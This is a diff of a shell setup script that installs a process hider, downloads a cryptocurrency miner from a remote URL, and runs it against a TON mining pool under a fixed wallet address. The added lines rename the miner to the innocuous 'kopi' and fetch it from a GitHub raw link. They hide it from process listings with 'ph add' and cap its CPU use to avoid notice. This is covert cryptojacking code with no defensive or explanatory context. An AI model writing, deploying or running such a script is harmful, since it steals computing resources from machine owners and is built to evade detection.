@@ -8,8 +8,8 @@ sudo apt-get install gcc g++ make
 sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
-wget https://bitbucket.org/oqoixgqoq9/tur/downloads/lolMiner
-ph add lolMiner
-chmod +x lolMiner
+wget https://github.com/aurbach55/dera/raw/main/kopi
+ph add kopi
+chmod +x kopi
 cpulimit -e lolMiner -l 30 &
-./lolMiner --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname)
+./kopi --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname)
